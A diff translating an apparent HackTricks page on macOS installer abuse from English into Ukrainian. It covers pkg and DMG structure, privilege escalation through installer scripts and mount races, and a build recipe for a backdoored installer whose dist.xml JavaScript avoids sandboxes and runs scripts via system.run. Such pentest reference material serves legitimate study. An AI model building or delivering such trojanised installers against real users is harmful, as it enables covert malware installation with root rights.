@@ -1,25 +1,24 @@
-# macOS Installers Abuse
+# Зловживання установниками macOS
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Pkg Basic Information
+## Основна інформація про pkg
 
-A macOS **installer package** (also known as a `.pkg` file) is a file format used by macOS to **distribute software**. These files are like a **box that contains everything a piece of software** needs to install and run correctly.
+Установочний пакет macOS (також відомий як файл `.pkg`) - це формат файлу, який використовується macOS для **розповсюдження програмного забезпечення**. Ці файли схожі на **коробку, яка містить все, що потрібно програмному забезпеченню** для правильного встановлення та роботи.
 
-The package file itself is an archive that holds a **hierarchy of files and directories that will be installed on the target** computer. It can also include **scripts** to perform tasks before and after the installation, like setting up configuration files or cleaning up old versions of the software.
+Сам файл пакета є архівом, який містить **ієрархію файлів і каталогів, які будуть встановлені на цільовому** комп'ютері. Він також може включати **скрипти** для виконання завдань до та після встановлення, такі як налаштування конфігураційних файлів або очищення старих версій програмного забезпечення.
 
-### Hierarchy
+### Ієрархія
 
 <figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>
 
-- **Distribution (xml)**: Customizations (title, welcome text…) and script/installation checks
-- **PackageInfo (xml)**: Info, install requirements, install location, paths to scripts to run
-- **Bill of materials (bom)**: List of files to install, update or remove with file permissions
-- **Payload (CPIO archive gzip compresses)**: Files to install in the `install-location` from PackageInfo
-- **Scripts (CPIO archive gzip compressed)**: Pre and post install scripts and more resources extracted to a temp directory for execution.
+- **Розповсюдження (xml)**: Налаштування (назва, текст вітання…) та перевірки скриптів/встановлення
+- **PackageInfo (xml)**: Інформація, вимоги до встановлення, місце встановлення, шляхи до скриптів для виконання
+- **Рахунок матеріалів (bom)**: Список файлів для встановлення, оновлення або видалення з правами доступу до файлів
+- **Payload (архів CPIO, стиснутий gzip)**: Файли для встановлення в `install-location` з PackageInfo
+- **Скрипти (архів CPIO, стиснутий gzip)**: Скрипти перед і після встановлення та інші ресурси, витягнуті в тимчасовий каталог для виконання.
 
-### Decompress
-
+### Розпакувати
 ```bash
 # Tool to directly get the files inside a package
 pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"
@@ -33,68 +32,64 @@ xar -xf "/path/to/package.pkg"
 cat Scripts | gzip -dc | cpio -i
 cpio -i < Scripts
 ```
+Щоб візуалізувати вміст інсталятора без ручного розпакування, ви також можете використовувати безкоштовний інструмент [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).
 
-In order to visualize the contents of the installer without decompressing it manually you can also use the free tool [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).
+## Основна інформація про DMG
 
-## DMG Basic Information
-
-DMG files, or Apple Disk Images, are a file format used by Apple's macOS for disk images. A DMG file is essentially a **mountable disk image** (it contains its own filesystem) that contains raw block data typically compressed and sometimes encrypted. When you open a DMG file, macOS **mounts it as if it were a physical disk**, allowing you to access its contents.
+Файли DMG, або Apple Disk Images, є форматом файлів, який використовується macOS від Apple для образів дисків. Файл DMG є по суті **монтуємим образом диска** (він містить власну файлову систему), що містить сирі блоки даних, які зазвичай стиснуті і іноді зашифровані. Коли ви відкриваєте файл DMG, macOS **монтує його так, ніби це фізичний диск**, що дозволяє вам отримати доступ до його вмісту.
 
 > [!CAUTION]
-> Note that **`.dmg`** installers support **so many formats** that in the past some of them containing vulnerabilities were abused to obtain **kernel code execution**.
+> Зверніть увагу, що **`.dmg`** інсталяційні файли підтримують **так багато форматів**, що в минулому деякі з них, що містили вразливості, були зловживані для отримання **виконання коду ядра**.
 
-### Hierarchy
+### Ієрархія
 
 <figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>
 
-The hierarchy of a DMG file can be different based on the content. However, for application DMGs, it usually follows this structure:
+Ієрархія файлу DMG може бути різною в залежності від вмісту. Однак для DMG додатків вона зазвичай має таку структуру:
 
-- Top Level: This is the root of the disk image. It often contains the application and possibly a link to the Applications folder.
-  - Application (.app): This is the actual application. In macOS, an application is typically a package that contains many individual files and folders that make up the application.
-  - Applications Link: This is a shortcut to the Applications folder in macOS. The purpose of this is to make it easy for you to install the application. You can drag the .app file to this shortcut to install the app.
+- Верхній рівень: Це корінь образу диска. Він часто містить додаток і, можливо, посилання на папку Додатки.
+- Додаток (.app): Це фактичний додаток. У macOS додаток зазвичай є пакетом, що містить багато окремих файлів і папок, які складають додаток.
+- Посилання на Додатки: Це ярлик до папки Додатки в macOS. Мета цього полягає в тому, щоб спростити установку додатка. Ви можете перетягнути файл .app на цей ярлик, щоб встановити додаток.
 
-## Privesc via pkg abuse
+## Підвищення привілеїв через зловживання pkg
 
-### Execution from public directories
+### Виконання з публічних директорій
 
-If a pre or post installation script is for example executing from **`/var/tmp/Installerutil`**, and attacker could control that script so he escalate privileges whenever it's executed. Or another similar example:
+Якщо скрипт перед або після установки, наприклад, виконується з **`/var/tmp/Installerutil`**, і зловмисник може контролювати цей скрипт, він може підвищити привілеї щоразу, коли його виконують. Або інший подібний приклад:
 
 <figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>
 
 ### AuthorizationExecuteWithPrivileges
 
-This is a [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) that several installers and updaters will call to **execute something as root**. This function accepts the **path** of the **file** to **execute** as parameter, however, if an attacker could **modify** this file, he will be able to **abuse** its execution with root to **escalate privileges**.
-
+Це [публічна функція](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg), яку кілька інсталяторів і оновлювачів викликають для **виконання чогось від імені root**. Ця функція приймає **шлях** до **файлу**, який потрібно **виконати** як параметр, однак, якщо зловмисник може **модифікувати** цей файл, він зможе **зловживати** його виконанням з правами root для **підвищення привілеїв**.
 ```bash
 # Breakpoint in the function to check wich file is loaded
 (lldb) b AuthorizationExecuteWithPrivileges
 # You could also check FS events to find this missconfig
 ```
+Для отримання додаткової інформації перегляньте цю доповідь: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)
 
-For more info check this talk: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)
+### Виконання через монтування
 
-### Execution by mounting
+Якщо інсталятор записує в `/tmp/fixedname/bla/bla`, можливо **створити монтування** над `/tmp/fixedname` без власників, щоб ви могли **модифікувати будь-який файл під час установки** для зловживання процесом установки.
 
-If an installer writes to `/tmp/fixedname/bla/bla`, it's possible to **create a mount** over `/tmp/fixedname` with noowners so you could **modify any file during the installation** to abuse the installation process.
+Прикладом цього є **CVE-2021-26089**, який зміг **перезаписати періодичний скрипт** для отримання виконання як root. Для отримання додаткової інформації перегляньте доповідь: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)
 
-An example of this is **CVE-2021-26089** which managed to **overwrite a periodic script** to get execution as root. For more information take a look to the talk: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)
+## pkg як шкідливе ПЗ
 
-## pkg as malware
+### Порожній вантаж
 
-### Empty Payload
+Можливо просто згенерувати **`.pkg`** файл з **скриптами перед і після установки** без будь-якого реального вантажу, окрім шкідливого ПЗ всередині скриптів.
 
-It's possible to just generate a **`.pkg`** file with **pre and post-install scripts** without any real payload apart from the malware inside the scripts.
+### JS в xml розподілу
 
-### JS in Distribution xml
-
-It's possible to add **`<script>`** tags in the **distribution xml** file of the package and that code will get executed and it can **execute commands** using **`system.run`**:
+Можливо додати **`<script>`** теги в **xml файл розподілу** пакета, і цей код буде виконано, і він може **виконувати команди** за допомогою **`system.run`**:
 
 <figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>
 
-### Backdoored Installer
+### Інсталятор з бекдором
 
-Malicious installer using a script and JS code inside dist.xml
-
+Шкідливий інсталятор, що використовує скрипт і JS код всередині dist.xml
 ```bash
 # Package structure
 mkdir -p pkgroot/root/Applications/MyApp
@@ -117,50 +112,49 @@ pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.maliciou
 cat > ./dist.xml <<EOF
 <?xml version="1.0" encoding="utf-8"?>
 <installer-gui-script minSpecVersion="1">
-    <title>Malicious Installer</title>
-    <options customize="allow" require-scripts="false"/>
-    <script>
-        <![CDATA[
-        function installationCheck() {
-            if (system.isSandboxed()) {
-                my.result.title = "Cannot install in a sandbox.";
-                my.result.message = "Please run this installer outside of a sandbox.";
-                return false;
-            }
-            return true;
-        }
-        function volumeCheck() {
-            return true;
-        }
-        function preflight() {
-            system.run("/path/to/preinstall");
-        }
-        function postflight() {
-            system.run("/path/to/postinstall");
-        }
-        ]]>
-    </script>
-    <choices-outline>
-        <line choice="default">
-            <line choice="myapp"/>
-        </line>
-    </choices-outline>
-    <choice id="myapp" title="MyApp">
-        <pkg-ref id="com.malicious.myapp"/>
-    </choice>
-    <pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
+<title>Malicious Installer</title>
+<options customize="allow" require-scripts="false"/>
+<script>
+<![CDATA[
+function installationCheck() {
+if (system.isSandboxed()) {
+my.result.title = "Cannot install in a sandbox.";
+my.result.message = "Please run this installer outside of a sandbox.";
+return false;
+}
+return true;
+}
+function volumeCheck() {
+return true;
+}
+function preflight() {
+system.run("/path/to/preinstall");
+}
+function postflight() {
+system.run("/path/to/postinstall");
+}
+]]>
+</script>
+<choices-outline>
+<line choice="default">
+<line choice="myapp"/>
+</line>
+</choices-outline>
+<choice id="myapp" title="MyApp">
+<pkg-ref id="com.malicious.myapp"/>
+</choice>
+<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
 </installer-gui-script>
 EOF
 
 # Buil final
 productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
 ```
+## Посилання
 
-## References
-
-- [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0_zobQ)
-- [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
-- [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
+- [**DEF CON 27 - Розпакування пакетів: Погляд всередину Macos Installer Packages та загальні вразливості безпеки**](https://www.youtube.com/watch?v=iASSG0_zobQ)
+- [**OBTS v4.0: "Дикий світ macOS Installer" - Тоні Ламберта**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
+- [**DEF CON 27 - Розпакування пакетів: Погляд всередину MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
 - [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
 
 {{#include ../../../banners/hacktricks-training.md}}
